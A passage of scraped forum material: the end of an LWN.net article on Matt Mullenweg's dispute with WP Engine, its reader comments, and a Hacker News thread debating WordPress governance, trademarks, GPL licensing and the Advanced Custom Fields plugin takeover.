seeing others find financial success from his project even though WordPress is uncommonly successful \"in terms of impact, success, and financial return for its creator\". Mullenweg's actions, Ronacher said, \"have alienated many who would otherwise support him. He's turning into a 'mad king'\". That is deeply unfortunate, because the questions about sustainability of open-source projects, and who profits from them versus who produces them, are in need of addressing. Instead of having that conversation, Mullenweg has put questions about governance, centralized software distribution, and software supply chains at the forefront. After decades of being a poster child for the goodness of open source, WordPress is becoming a case study in the dangers of the company-owned project model. Instead of being the safe choice, WordPress is starting to be seen as the risky one—and that perception may impact open source as a whole. to post comments ugh Posted Oct 14, 2024 19:21 UTC (Mon) by crlf (subscriber, #25122) [Link] (9 responses) Mullenweg's response to dhh today is telling of his character / probably deserves a link. ugh Posted Oct 14, 2024 19:49 UTC (Mon) by jzb (editor, #7867) [Link] (4 responses) You're referring to this post, I'm guessing? I had missed it or it came out around the time I hit publish - not sure. ugh Posted Oct 15, 2024 8:50 UTC (Tue) by geert (subscriber, #98403) [Link] Unfortunately that link no (longer?) works... ugh Posted Oct 15, 2024 9:04 UTC (Tue) by jamielinux (subscriber, #82303) [Link] (2 responses) That link 404s now as Matt apparently deleted his post. It's not on web archive either. But for anyone else reading, as helpfully pointed out by someone on HN, it's still available on Bing cache: https://cc.bingj.com/cache.aspx?q=https%3a%2f%2fma.tt%2f2... ugh Posted Oct 15, 2024 9:22 UTC (Tue) by knewt (subscriber, #32124) [Link] Also available here: https://archive.today/https://ma.tt/2024/10/on-dhh/ And showing roughly when it went walkies as well ugh Posted Oct 15, 2024 11:10 UTC (Tue) by smurf (subscriber, #17840) [Link] Well, for the sake of the Wordpress community let's hope that he has learned something from the mountain of negative feedback he's got for that blog post (as opposed to simply running away from it). ugh Posted Oct 14, 2024 19:51 UTC (Mon) by smurf (subscriber, #17840) [Link] (2 responses) Who is \"dhh\", and why don't you put the link into your comment? ugh Posted Oct 14, 2024 21:33 UTC (Mon) by dskoll (subscriber, #1630) [Link] (1 responses) dhh is David Heinemeier Hansson of Ruby on Rails fame, and he wrote a post that was pretty critical of Automattic and Matt Mullenweg ugh Posted Oct 15, 2024 11:28 UTC (Tue) by ballombe (subscriber, #9523) [Link] ... which include this '' It's even more outrageous that Automattic has chosen trademarks as their method to get their \"Al Capone\" when up until 2018 they were part owners of WP Engine before selling their stake to Silver Lake! '' If indeed Automattic has sold its share of WP Engine, then surely the buyer should be considered to have contributed to WordPress by buying them. dhh post ends by \"But I suspect Automattic wants to have their cake and eat it too. \" This seems a apt summary. ugh Posted Oct 14, 2024 22:27 UTC (Mon) by eean (subscriber, #50420) [Link] I like how it's a bullet list of crimes and the crime is not leveraging enough money on software he created. Burning bridges... Posted Oct 14, 2024 19:40 UTC (Mon) by NightMonkey (subscriber, #23051) [Link] (4 responses) When a company or individual complains that \"their\" F/OSS is being used to make money that someone else, they say, \"doesn't deserve\", the spirit of F/OSS is already being dismissed. Open Source does in no way guarantee *anyone* money, revenue or profit. Or fame. Or respect. Or a career. It just means what the license says, and that's it. (CLAs undermine the spirit as well.) If you are competing for business and profit, you have many choices in licensing your software. F/OSS may or may not be the right choice. This article seems very relevant: https://www.linuxfoundation.org/blog/how-open-source-foun... Burning bridges... Posted Oct 14, 2024 21:04 UTC (Mon) by willy (subscriber, #9762) [Link] (3 responses) It's not exactly unique to working on Open Source. History is full of examples of people who had good ideas but their employer took all the profit. Here's a $100 gift card for your trouble. I did about 1/3 of the spec work for NVMe 1.0. I barely even got an internal \"attaboy\" reward. The Windows team got some Divisional Recognition Award for writing the Windows driver (this is a fairly big deal at Intel). Some people who contributed a few lines to the spec founded a company based on NVMe that got sold for $1bn. You can't get upset about these things. Nobody owes you anything unless you have a contract. Burning bridges... Posted Oct 15, 2024 11:07 UTC (Tue) by Heretic_Blacksheep (subscriber, #169992) [Link] And even then you better read the fine print and have a contract lawyer review any potential loop holes in the contract and relevant law with you. Gatekept projects like this one should already have this big blinking sign over them that reads something like \"You don't own this star, hitch your only wagon to it at your peril.\" I'm unsympathetic with all sides, including the Word Press users, for the aforementioned gigantic red flag waving in the storm winds. Use such products with the ongoing understanding that wagon's spars can be cut loose and destroyed at any given time and plan accordingly. Burning bridges... Posted Oct 15, 2024 13:52 UTC (Tue) by raven667 (subscriber, #5198) [Link] (1 responses) > History is full of examples of people who had good ideas but their employer took all the profit. Here's a $100 gift card for your trouble. This is an area where software engineering unions could help by facilitating an adult/peer conversation between the creators of value and the managers/takers of value as to how much each party should be skimming off the top for their personal wealth. There should be formal systems in place, like standard contracts, to ensure that at least some proportional part of the value makes it back to the people who create it and isn't _entirely_ captured by low-value middlemen (even if it mostly is ;-), $100 gift cards are probably not sufficient. Anyway, that's a bit of a tangent. At least Automattic was willing to spend $30k/head to buy out 150+ employees who think their leadership is nuts. Burning bridges... Posted Oct 17, 2024 5:43 UTC (Thu) by kn (guest, #124511) [Link] > There should be formal systems in place, like standard contracts, to ensure that at least some proportional part of the value makes it back to the people who create it Should employees cover parts of company losses as well? If not that would just punish entrepreneurship and risk-taking. If people want a bigger piece of the pie, there are stock options. Most people don't like risk. Great stuff Posted Oct 14, 2024 19:43 UTC (Mon) by yeltsin (subscriber, #171611) [Link] (1 responses) Thank you for researching all this mess and condensing it so neatly, it's impossible to keep track of on your own. Great stuff Posted Oct 14, 2024 19:50 UTC (Mon) by jzb (editor, #7867) [Link] That's what we're here for. Thanks for the kind words! is this in character? Posted Oct 14, 2024 19:49 UTC (Mon) by roc (subscriber, #30627) [Link] (2 responses) I would be interested to hear whether this is in character for Mullenweg (from the point of view of those who know him well) or rapid-onset insanity. is this in character? Posted Oct 14, 2024 21:10 UTC (Mon) by Wol (subscriber, #4433) [Link] (1 responses) From what I've seen, it sounds like it's in character. It also sounds (from this dhh post) that Mullenweg actually doesn't understand trademark law (and probably IP law generally). That statement about use of the Rails trademarks pretty much states the LAW's stance on the matter, not dhh's. For Mullenweg to slag dhh off for merely re-stating the law doesn't give you much confidence in Mullenweg's grasp of reality ... Cheers, Wol is this in character? Posted Oct 15, 2024 11:41 UTC (Tue) by Heretic_Blacksheep (subscriber, #169992) [Link] Two things to remember when it comes to the law: neither side knows how any given court and/or jury is going to decide any specific case (at least in the US), and in this case neither one is a lawyer. DHH can call on examples all he wants, but in the end he's not qualified to give a legal opinion so take his assertions as you would any layman's. Being an 'expert' on open source doesn't mean he's qualified to make an 'expert' opinion on the _law_ even as it applies to open source. Especially not internationally. The only thing he can do is point out similar cases, if any, then let others draw their own opinions from that. Keep in mind that even if a case appears similar, it may diverge in what may appear insignificant ways to a layman, but important to qualified lawyers. I skimmed DHH's opinion, and it seems reasoned and sane. But don't forget he's a layman, not a lawyer. Glad I decided to not use WP Posted Oct 15, 2024 1:57 UTC (Tue) by felixfix (subscriber, #242) [Link] A few months ago, I was looking to start a sort-of blog / repository, and tried WP locally. It looked mostly like overkill for what I wanted to start with, too many choices (\"nobody needs 23 types of deodorant\") for such a small project, so I started something on Substack. Not really what I wanted, but good enough, and a lot simpler to start with, up and running in 5 minutes. What bothered me the most about WP was a seemingly random incoherent system for a newbie. Too many themes, and the only differentiation was their marketing jargon (\"A free multi-diverse fresh re-imagining of ...\") which told me nothing, and no sample pages to try them out without downloading and installing and possibly paying. I don't have the time or patience to try dozens of themes, especially when I know so little to start with, and there seemed to be thousands with content-free descriptions. But I had no idea there was this much drama going on behind the scenes. It seems in hindsight to match the confusing mess I saw, which probably is fine once you've climbed that steep learning curve. I was also confused by having multiple web site sources, which I now realize WP Engine didn't help any. Mullenweg sounds like a disaster. Maybe the community can sort things out, maybe not. Maybe someday my Substack will need more and I'll look again. But I won't do it as long as Mullenweg is fouling the waters. Tough, but that's business Posted Oct 15, 2024 5:09 UTC (Tue) by zorro (subscriber, #45643) [Link] (6 responses) I don't think this is about open source. This is about two commercial entities where one, WP Engine, built it's business on the free services provided by the other, Automattic, without a contract in place. And, yes, that means you can lose access to those services at any time and for any reason. Tough, but that's business. Tough, but that's business Posted Oct 15, 2024 5:58 UTC (Tue) by felixfix (subscriber, #242) [Link] And both parties can lose tremendous goodwill. Mutual Assured Destruction. Tough, but that's business Posted Oct 15, 2024 6:37 UTC (Tue) by smurf (subscriber, #17840) [Link] (1 responses) I don't think so. When your IP is what amounts to public infrastructure and you allow basically anybody to use it, discrimination against any one entity can and probably (IANAL and all that) will be construed as unfair business practice. And sorry but if blocking a single company from updates and kicking out their widely-used ACF plugin isn't unfair practice, I don't know what else that term should mean. Tough, but that's business Posted Oct 15, 2024 14:02 UTC (Tue) by kleptog (subscriber, #1183) [Link] If nothing else, these actions would deny them the protection of being a 'mere conduit' for the purpose of the digital services act. Whether there's actually any legal recourse is a different question. Tough, but that's business Posted Oct 15, 2024 8:16 UTC (Tue) by taladar (subscriber, #68407) [Link] A competing company losing access to the infrastructure is one thing. Banning anyone who merely asks for clarification on that new checkbox seems incredibly self-destructive though. Tough, but that's business Posted Oct 15, 2024 13:44 UTC (Tue) by raven667 (subscriber, #5198) [Link] That's not dissimilar to the relationship between IBM/Redhat and Oracle, and a lot of people have taken exception to even the mild case of consolidating patches in kernel RPMs, let alone blocking a community member, instituting a loyalty test and expropriating their code. Tough, but that's business Posted Oct 15, 2024 15:14 UTC (Tue) by Paf (subscriber, #91811) [Link] Given the way the dispute is being handled is hugely impacting the open source project and its users, I think I have to disagree. There’s a corporate dispute but it’s a dispute centered on an open source project. Governance of FOSS when powering a profitable commercial ecosystem Posted Oct 15, 2024 14:15 UTC (Tue) by raven667 (subscriber, #5198) [Link] > the questions about sustainability of open-source projects, and who profits from them versus who produces them, are in need of addressing. Instead of having that conversation, Mullenweg has put questions about governance, centralized software distribution, and software supply chains at the forefront. I think there is still room to have a conversation about governance and how when you have multiple large competing companies who profit and collaborate on an open-source software platform there needs to be an *independent* Foundation which acts as a mediator for their competing interests and has sustainability of the platform as their primary goal, rather than the private profit of any one of the organizations. The independence of Fedora from Redhat, the Linux Foundation and its relationship with Intel, the FAANG, Samsung, Microsoft, IBM, Oracle, Cisco, etc. etc. which prevents them from knifing each other in the back, and many others is a main thing that WP lacks, MM's insistence on personally controlling WordPress.org and Foundation as well as Automattic is what's creating a conflict of interest, the large community of commercial vendors who depend on the ecosystem don't have representation and a formal way to mediate what should be a private spat between Automattic and WP Engine. If WordPress.org isn't having the cost of running the package repository properly accounted for they can lobby both Automattic and WP Engine and others to defray costs, maybe setup tiering where small individual instances don't pay but hosting companies with more than X number of installs are asked to contribute something toward maintenance. There seem to be a number of people who view FOSS as a free resource to strip mine for value with no thought about contributing to maintenance and sustainability (the oldest license, the GPL, has obligations for those who sell it that encourage maintenance and sustainability), that FOSS developers are basically employees they don't have to pay, rather than partners who share a goal. Maybe that's why \"open-core\" products tend not to foster much of a community, but shared infrastructure, that wouldn't stand alone as a product, does more often. Copyright © 2024, Eklektix, Inc. Comments and public postings are copyrighted by their creators. Linux is a registered trademark of Linus Torvalds",
    "commentLink": "https://news.ycombinator.com/item?id=41866328",
    "commentBody": "WordPress retaliation impacts community (lwn.net)221 points by chmaynard 14 hours agohidepastfavorite137 comments crabmusket 13 hours agoI hope that one positive outcome of this whole debacle will be people realising that the Wordpress Foundation board is apparently three Matt Mullenwegs in a trenchcoat: https://www.pluginvulnerabilities.com/2024/09/24/who-is-on-t... (I exaggerate, slightly.) This is clearly not what an independent foundation with the interests of the open source project in mind looks like. If this mess creates pressure to put more separation between the Foundation and Automattic, I think that can only be a good thing. reply labster 13 hours agoparentI’m the president of an internet nonprofit (miraheze.org) and we have five active directors with an annual budget of ~$10k. We have elections for community appointed directors as well. This stuff is not hard. By comparison, the WordPress Foundation is just embarrassing. One of the biggest OSS projects in the world operating as a vanity project for Matt instead of being a stakeholder group, or doing much of anything. reply Ennea 11 hours agorootparentOh heck, Miraheze spotted in the wild. Thank you for the work you do, it's invaluable. reply cdaringe 2 hours agorootparentprevI wanted to learn more about your vision, how you operate, etc, so i clicked your about link: > There is currently no text in this page. You can search for this page title in other pages, search the related logs, or create this page. reply labster 6 minutes agorootparentThanks for the report. It’s a wiki farm so most of us go directly to the RecentChanges page instead of the landing page. I will change the link to point here instead: https://meta.miraheze.org/wiki/FAQ reply dovin 14 hours agoprevI've been trying to wrap my head around why this feels so wrong. If the project had been run like this from the beginning, in an opinionated way that prioritizes what the few creators of the project think are important, then that's one thing. But it seems like Wordpress has generally been the stable, boring, slow-moving project that isn't run like a personal fiefdom, and Mullenweg is trying to force it from the one model to the other. I haven't used Wordpress in years, and this drama makes me never want to use it again. reply bad_user 13 hours agoparentInitially, I was taking the side of WP.org and Automattic; however, I changed my mind completely once they took over the “Advanced Custom Fields” plugin, and replaced it with another plugin that broke people's websites. So Matt weaponized the WP package repository, and stole the users of a well-maintained package, making WP site admins work over the weekend to fix the breakage. This isn't opinionated, this is theft. If the project had been run like this since the beginning, it wouldn't be where it is today. Automattic is a rich company partially due to the community around WordPress, and the trust that community has had in the governance of the project. reply usaphp 12 hours agorootparent> replaced it with another plugin that broke people's websites What makes you think it broke someone’s website? AFAIK they just patched the security issue that wp engine team couldn’t patch because they were locked out from pushing to repo? reply bad_user 12 hours agorootparentFirstly, the security patch was already published by the ACF team, and that wasn't the code that was pushed. This was a package takeover, slug, reviews, users, everything: https://www.advancedcustomfields.com/blog/acf-plugin-no-long... People woke up to their website being updated to “Secure Custom Fields”, an alternative (or a fork) that's not fully compatible. Here's one such report from HN: https://news.ycombinator.com/item?id=41830709 reply danieljacksonno 10 hours agorootparentprevThey turned off all pro features reply slg 13 hours agoparentprevIt reminds me of Reddit cracking down on 3rd party apps or Twitter changing that policy and a whole lot more once Musk took over. The problem isn't necessarily the actions or policies in a vacuum. There are legitimate benefits to these approaches. The problem is it feels like these communities were built up around certain practices and there was no reason to expect those practices to change. So when there is a big change that only happens after a platform has already reached near monopoly status, it feels like a bait and switch to users because many people would have never signed up for a platform with those policies in the first place. reply Sharlin 13 hours agorootparentI guess the moral of the story is that everything must be assumed to be bait-and-switch in the presence of capital interests. reply MichaelZuo 10 hours agorootparentWhy can’t other interests, such as labour interests, also bait-and-switch? reply crabmusket 6 hours agorootparentHere's my conjecture: doing so is not in the interests of labour. So to the extent that labour has power, it would tend to act differently. reply immibis 6 hours agorootparentprevThey CAN, but capital interests ARE. Speculation: labour interests care about making enough money to get by, while capital interests care about making maximum money and are therefore insatiable. reply Gud 3 hours agorootparentWhat makes you think most labour are interested in “getting by”? In my experience, they aren’t. reply immibis 1 hour agorootparentHow often do you ask your boss for a raise or go job hunting? 1. When your money's running low or your job feels shitty, or 2. Constantly whenever you think you can get a raise or a better job reply wrs 12 hours agoparentprevWordpress has always been a personal fiefdom. This is quite reminiscent of the Great GPL Themes Kerfuffle of 2009 [0], actually. Stakes are a lot higher now, of course. [0] https://thenextweb.com/news/wordpress-and-thesis-go-to-battl... reply slimsag 13 hours agoparentprevIn 2021 Automattic, the company that effectively owns Wordpress, has a valuation of $7.5 billion in 2021, and revenue of $750M in 2024. It's big money. reply bilekas 13 hours agoparentprev> Mullenweg is trying to force it from the one model to the other There are proper ways to do that, changing the license in a next version for example is how I think it should have been done in the first place. I've said it before here but this has all the markings of being extremely petty and Mullenweg not happy with their own licensing model. reply bad_user 12 hours agorootparent> There are proper ways to do that, changing the license in a next version All the projects doing that will soon discover that they were popular mostly because of the Open-Source licensing. Once that changes, the popularity, and goodwill go down, for the simple reason that trust gets breached and forks happen. Open-Source is essentially about the freedom to fork, and that's precisely what happens when governance fails. Some of them will backtrack on that decision, but it will be too late; like ElasticSearch recently changing again to AGPL, except now the question is why would people choose it over the more trustworthy, open and secure OpenSearch. There's nothing wrong with building proprietary software, but there is something wrong with pulling a bait-and-switch, betraying your community that invested in your product because of its Open-Source nature. Matt surely knows that, and also, changing the license of WordPress is probably not possible due to them not having the full copyright. WordPress is not really theirs, despite all their contributions. Which is why this will not end well for Automattic. reply ValentineC 13 hours agorootparentprev> There are proper ways to do that, changing the license in a next version for example is how I think it should have been done in the first place. WordPress is GPL because it is a fork of b2/cafelog: https://wordpress.org/book/2015/11/the-blogging-software-dil... reply bigiain 12 hours agorootparentprev> changing the license in a next version Can Matt do that though? I don't _think_ WordPress has a copyright assignment agreement for contributors? So neither Matt nor Automattic nor wordpress.org nor The WordPress Foundation can choose to re-license future versions of the GPL2 or newer codebase without agreement from _all_ the contributors who retain the copyright in their part of the code. reply anon7000 10 hours agorootparentThere is no chance the license changes. Matt has been a very, very vocal supporter of GPL. This self-described war he’s going on is all about commercial trademarks, and other hosting companies having more commercial success than Automattic in the ecosystem while contributing fewer developers and less money to the project. Now, he’s taken it to a very extreme extent, and I fully disagree with his approach, but the core issues (for him) have nothing to do with GPL and how the WP project is governed. Those has even the same for decades, and he’s not trying to change them. He’s just being very self-destructed because it turns out the community has no interest in some kind of “war” that gets long term contributors locked out of the ecosystem. He was expecting more people to be on his side, and frankly now seems to be lashing out (by blocking people) when that didn’t happen None of that means he’s trying to change the governance model or license. reply bilekas 8 hours agorootparent> This self-described war he’s going on is all about commercial trademarks, and other hosting companies having more commercial success than Automattic in the ecosystem while contributing fewer developers and less money to the project. I don't really buy that, there is no obligation for anyone to contribute to the project at all under the GPL license so he can feel whatever he want's about it but it's irrelevant. Also as for the trademark issue, in an older version of their trademark stated \"The abbreviation “WP” is not covered by the WordPress trademarks, meaning people may use as they see fit. \" You can't retroactively change it once you see other people making more money than you. That's not how trademarks work. reply immibis 6 hours agorootparentprevThat would be illegal, since Matt doesn't own the full copyright to WordPress, since it's a fork of another project. reply CodeWriter23 13 hours agoparentprev> Wordpress has generally been the stable, boring, slow-moving project 80% annual codebase churn (according to Theo) says otherwise reply stefanfisk 11 hours agorootparentSince they started their crazy Gutenberg project things have certainly not been slow moving and stable… reply MichaelZuo 10 hours agorootparentIt really messed a lot of things up, editing my blog used to be seamless and after it took multiple seconds to even load the editor. reply fbnlsr 12 hours agoparentprevI'm probably wrong here, but my tinfoil hat take is that Matt has seen how well Taylor Otwell is doing with Laravel and he wants a piece of that cake. Granted they're doing pretty good with wordpress.com hosting, but they'd have so much more money if they licenced plugins and features the way Laravel does. reply FireBeyond 2 hours agorootparentThat might be part of it, though I think the more pressing boat anchor around Automattic's neck is the money pit that Tumblr is, for what seems like very little return. reply jcranmer 14 hours agoprevOn the off-chance that Matt is doing the irresponsible thing here and still getting involved in social media discussions on this topic: People don't like being involved in drama, and as we saw with the Freenode debacle, when it starts up, the usual first reaction is to try to chart a path that lets them avoid the drama as much as possible. But when you demand that those people take sides, and pursue a scorched earth policy against those who don't take your side... the side that's going to be picked isn't your side. There's just too much risk to taking your side. reply dylan604 14 hours agoparent> People don't like being involved in drama, Which is kind of a weird thing, as people sure do love to sit back with their popcorn and watch the drama. There's entire TV networks dedicated to banality just like this. reply icehawk 11 hours agorootparentHow is it weird that people who do not like being involved in drama do things where they are not involved in the drama. reply dylan604 4 hours agorootparentBecause it's a sad comment on human nature. We know what it's like to be part of the drama, and it's never a good thing. Yet we perversely enjoy sitting back watching people go through it. We like to say schadenfreude because it's a fun word to say for non native speakers, but it's not a good thing. reply bad_user 12 hours agorootparentprevWebsite owners and admins don't have the luxury of enjoying this particular drama, and they are the ones that matter. reply jcranmer 14 hours agorootparentprevOh yeah, this is a fantastic thing to sit back and munch popcorn to. It's when the people involved are demanding that you stop munching the popcorn and start throwing knives at someone that the fun stops. reply labster 13 hours agorootparentYep, I’m browsing this topic with popcorn right now, with no skin in the game. It’s great fun! Sorry if this is your livelihood, folks, but I can’t do anything to actually help. So I’ll just enjoy the fireworks and try to apply any lessons learned to other OSS communities. reply Teever 12 hours agorootparentprevIt's not weird if you think about it. How can you sit back and watch the drama if you're a part of it? reply Log_out_ 13 hours agoparentprevPeople = companies such as my own do not like = have not prized in drama = the idea that the free meal could walk off thr plate. reply CodeWriter23 13 hours agoprev@WPEngine - fork Wordpress, rebrand yourself and the code. Setup a plugin / update hub like Wordpress.org and provide a pathway for your customers and devs to migrate. I recognize this is non-trivial. Ending an abusive relationship usually is. reply spiderfarmer 12 hours agoparentThey profit off Wordpress' brand for free. Maintaining a fork and building a new brand will be expensive. As much as I despise Matt's antics, there's not much to gain for WPEngine by forking it. The best scenario for all parties is to burry the hatch and for Matt to step down. reply y-curious 12 hours agorootparentJust so you know, the phrase is \"bury the hatchet\" which comes from the Native American practice of burying weapons in times of peace. reply spiderfarmer 6 hours agorootparentThanks. I should have googled it before posting, I'm not a native speaker. reply CodeWriter23 2 hours agorootparentprevHe’s not going to step down. And if his beef (as stated) is companies making money with WordPress without contributing back, where’s the line? The top page builders like Divi and Elementor all do the same with their cloud offerings. Does he sue them next, simply for using the word “WordPress” to indicate compatibility in their marketing materials? Who wants to invest time and money simply to have Matt steal your work on a whim. Don’t make the mistake of assuming Matt’s scope is limited to WPEngine; the kind of personality that acts in this way will do the same to anyone. reply kergonath 12 hours agorootparentprev> They profit off Wordpress' brand for free. What the hell are you on about? Wordpress is GPL. Are all Linux distro profiting off Linus’ brand? There is a very simple thing you can do if you don’t want people to do this: use a different license. You cannot eat your cake and keep having it. > Maintaining a fork and building a new brand will be expensive. Publishing free software is a decision. You cannot come years later to say “no, actually you need to pay”, or “yeah, it’s free but not like that”. The whole “WPE does not contribute” point is completely disingenuous and I cannot believe that people are still uttering it in good faith. > The best scenario for all parties is to burry the hatch and for Matt to step down. The best scenario is Wordpress going up in flames, Matt being utterly ridiculed for his dishonest behaviour and the whole thing serving as a cautionary tale. reply Brian_K_White 1 hour agorootparentWordpress can't actually use another license because... Wordpress is itself a fork of gpl software. It just gets better and better the more you learn about this guy. reply silverliver 11 hours agorootparentprev> What the hell are you on about? Wordpress is GPL. Are all Linux distro profiting off Linus’ brand? > There is a very simple thing you can do if you don’t want people to do this: use a different license. You cannot eat your cake and keep having it. Not taking sides here, but the GPL did not include a trademark grant the last time I checked. In fact, treating copyright and trademark rights separately is a fairly well-established strategy in the open source world (e.g.Firefox and Ubuntu). reply kergonath 8 hours agorootparentYou are entirely right. But trademark has nothing to do with the “not contributing to the community” thing, whatever that means. Going after Wordpress-Engine with a trademark angle makes sense. Although: 1- I don’t think that would hold any water against “WPE” 2- trademark needs to be defended (in the US at least) and you cannot let things slide for 5 years and then claim infringement. In any case, that’s not what happened. The trademark aspect was clearly an afterthought and is not the central point of the dispute. reply atonse 6 hours agorootparentprevHe’s using trademarks because that’s all he can do. But this is about the money and jealousy about how WP Engine is making a ton of money Without adding more developers to contribute. reply immibis 6 hours agorootparentprevWPEngine hasn't actually violated any trademarks. Matt's using trademark law because it's the least stupid lawsuit he could think of, not because he has a case reply spiderfarmer 6 hours agorootparentprev> Are all Linux distro profiting off Linus’ brand? Those aren't forks. Full forking the Linux kernel and rebranding it would be hard for the same reasons as forking and rebranding Wordpress. > Publishing free software is a decision. You cannot come years later to say “no, actually you need to pay”, or “yeah, it’s free but not like that”. That's not my point. My point is: if they want to fork it, it will be expensive. > The best scenario is Wordpress going up in flames, Matt being utterly ridiculed for his dishonest behaviour and the whole thing serving as a cautionary tale. Why would that be better? reply e40 5 hours agorootparentThis is precisely what Red Hat did, right? reply spiderfarmer 4 hours agorootparentRed Hat still includes the Linux kernel. Android would be a better example of an actual fork. reply kergonath 3 hours agorootparentprevThe context is getting a bit murky, so let’s start with this: > That's not my point. My point is: if they want to fork it, it will be expensive. That was your second point, and I don’t disagree with it. Now, for the rest of your post. > Those aren't forks. I am not sure what point you are making here. Forking has nothing to do with either ripping off anyone or trademarks. The possibility to fork software is a fundamental principle of free software. As in, you cannot have free software that cannot be forked. If you don’t want people to fork it, don’t make it free. Wordpress itself is a rebranded fork of b2, and nobody has any issue with that. > Full forking the Linux kernel and rebranding it would be hard for the same reasons as forking and rebranding Wordpress. If you fork a project you cannot use someone else’s IP, so you have to rebrand if the project name is a trademark. AFAIK, the Android kernels are forks and don’t use the Linux trademark, for example. Rebranding does not make forking any easier or harder, it’s completely orthogonal. You mean that it would be difficult because they would need to pay developers to maintain the fork, right? This is true, but it has nothing to do with ripping off anyone. Matt is not embarrassing himself because forking would be complicated. His message is clear, and you wrote it yourself: “they profit off Wordpress' brand for free”. Which is dishonest and misleading. reply Brian_K_White 1 hour agorootparentWPEngine do not profit off of Wordpress brand any more (or less) than a shoe store selling Nike shoes. WPEngine are profiting off of the service they provide, which is hosting software, which happens to be Wordpress. Wordpress can't say anything about contributing to wordpress core when Wordpress the supposedly seperate foundation in fact only serves the purposes of Automattic, and inhibits or rejects prs that Matt and Automattic don't want, ie anything that works against their paid addons and services. No one should volunteer 5 minutes of their time to wordpress untill wordpress is actually a community-serving project rather than just a Matt-serving product. Same goes for the plugin updates. They can't cry that anyone else is using them as a free distribution service when they actively work to keep it that way themselves. reply pixxel 12 hours agorootparentprev> Are all Linux distro profiting off Linus’ brand Poor analogy. All the distros I’ve ever used are totally free. reply bigiain 12 hours agorootparentOK, replace \"WPEngine\" with AWS/GCE/Azure/every-other-server-host. Thery all sell customer's services that rely on linux kernel (and gnu utilities). I don't see Torvalds or Stallman getting high and trying to extort them... reply kergonath 8 hours agorootparentprevBut not all of them are (I mean, they all publish the sources of the GPL components, but then WPE does as well). The situation is exactly the same: expecting other people to go beyond the terms of the license is lunacy. reply aitchnyu 10 hours agorootparentprevThe Linux copyright holders did pursue companies using Linux in the name, and distros were one exception. reply badlibrarian 14 hours agoprevMy mother has a WordPress site talking about hedgehogs and at this point it seems like it's only a matter of time before Matt's vendetta shows up in her site footer. reply enews01 13 hours agoparentcurious, whats that hedgehog website? reply tomovo 13 hours agorootparentsega.com? reply pixxel 12 hours agorootparentprevThere’s a ‘sport’ where contestants see who can kick a rolled up hedgehog over the most garden fences. Maybe that one? Or it was a Sean Lock joke. I forget. reply ookblah 14 hours agoprevBeen randomly thinking about it since this whole thing started, and beyond the drama it's clear that whether legal or not, Matt intends to use the trademark as a weapon to serve his purposes. If you just look at the timeline and even that response to DHH it feels to me that he has much resentment against others using the software and him not being able to be the largest beneficiary of it. The examples to Shopify being a billion dollar whatever and unable to capture, to applying for the recent trademarks around \"Wordpress Managed\" and such show me that's how he views it in the end. You are using \"Wordpress\" software, so he should of course get a cut of that. So many companies in the ecosystem have \"WP\" or \"Wordpress Managed/Wordpress Hosting\" as their tagline and have been for over the past decade. WPEngine is just the biggest target and the first in line. I have no soft spot for PE, but both can be bad in this case. I feel like Automattic is willing to burn the community to the ground or fracture it as long as they get their cut or become the the biggest player. \"Capturing value\" I suppose. reply immibis 6 hours agoparent\"WordPress hosting\" is an accurate description of what the product does and uses the term nominatively, which is legal. You couldn't call your company that, but within the company, you could call the product that hosts WordPress \"WordPress hosting\". (IANAL;TINLA) reply dylan604 13 hours agoparentprev> I feel like Automattic is willing to burn the community to the ground or fracture it as long as they get their cut or become the the biggest player. Just taking a page out of the app store playbooks. I guess Matt hasn't been keeping up with courts starting to rule against those stores. reply dotcoma 13 hours agoparentprev> \"Capturing value\". Matt behaving like a PE fund, or any standard Big Tech company. In other words, enshittification as usual. reply anon7000 10 hours agoparentprevYeah the DHH post is an example or projection… Automattic is hosting a lot of WordPress sites but not making anywhere near as much money as the WP Engines and Go Daddy’s of the ecosystem. (And yet automattic contributes the most to the project.) So it’s definitely a point of frustration to the business. reply Brian_K_White 24 minutes agorootparentThey only contribute the most because they reject anyone else's contributions. reply x3n0ph3n3 14 hours agoparentprev> even that response to DHH Can you link to what you're referring? reply ookblah 14 hours agorootparenti think the original got taken down but you can find it on archive or just searching around reply angch 14 hours agorootparentprevhttps://ma.tt/2024/10/on-dhh/ reply jcranmer 14 hours agorootparentHe appears to have replaced the original post, which was a lot more ad hominem: https://archive.ph/UZZit reply serial_dev 13 hours agorootparentFunnily enough, your archive is already a friendlier version, there is one with even more ad hominem: https://archive.ph/7ZRbY reply stevage 12 hours agorootparent> I’ll just remind everyone at the start that this is a respectful debate, and DHH and I tried to get on a call but couldn’t because we were both traveling. > DHH claims to be an expert on open source, but his toxic personality and inability to scale ... Yep, real respectful. I don't even understand the point of the post, other than to shit on the other guy. It doesn't advance any debate or raise any questions. reply zo1 13 hours agorootparentprevThe post as it is now sounds really decent and a step in the right direction. Let's not air all the dirty laundry happening here, it looks like Matt is trying to do the \"right\" thing here. Here is the current iteration of that post from Matt: \"I’ve taken this post down. I’ve been attacked so much the past few days; the most vicious, personal, hateful words poisoned my brain, and the original version of this post was mean. I am so sorry. I shouldn’t let this stuff get to me, but it clearly did, and I took it out on DHH, who, while I disagree with him on several points, isn’t the actual villain in this story: it’s WP Engine and Silver Lake.\" reply ookblah 13 hours agorootparentbut content is sacred right? /s he can link to his original post and put the clarification alongside if that's the case. i can change my mind if his actions show he's trying to do \"right\", but that takes time. for me, it's very important to know that he was even capable of writing the original post. reply lagniappe 11 hours agoprevOne positive outcome of this entire dispute is I picked up an old project where I wrote my own cms. It's been fun stepping through the code, and I'm tempted to take it further under a permissive license. reply octacat 9 hours agoprev- \"most people agree that WP Engine should contribute more to WordPress\" - ban them from the contributing. That is a special kind of logic. Also forking a plugin and replacing the original in the repo - that smells bad, even if it is \"legal\". reply benatkin 13 hours agoprevNice detailed article. However, in these two places it doesn't seem clear that it was just the Slack account that was deactivated. Here: > Javier Casares shared that his account was deactivated after he asked a series of questions in a Slack thread started by Colin Stewart. And here, referring to Terence Eden: > He later reported on Mastodon that his account was deactivated. Another thing – with that headline, I was hoping for some more info on how it impacts community like how many migrated away from WordPress or even a change in market share. However I'm not sure where that's available on a daily or weekly basis. Edit: here's one that does a report once a month. Not sure how accurate it is: https://w3techs.com/technologies/history_overview/content_ma... reply edent 13 hours agoparentI can confirm that only my Slack account has been deactivated. Although, that said, I anticipate an eventual purge of all WP related accounts for users involved in Lèse-majesté. Regarding usage, I wouldn't expect to see an immediate decline. It takes a long time to plan a migration, as users of ReiserFS found out. reply anon7000 10 hours agoparentprevI mean. It’s too early to say. If we’re 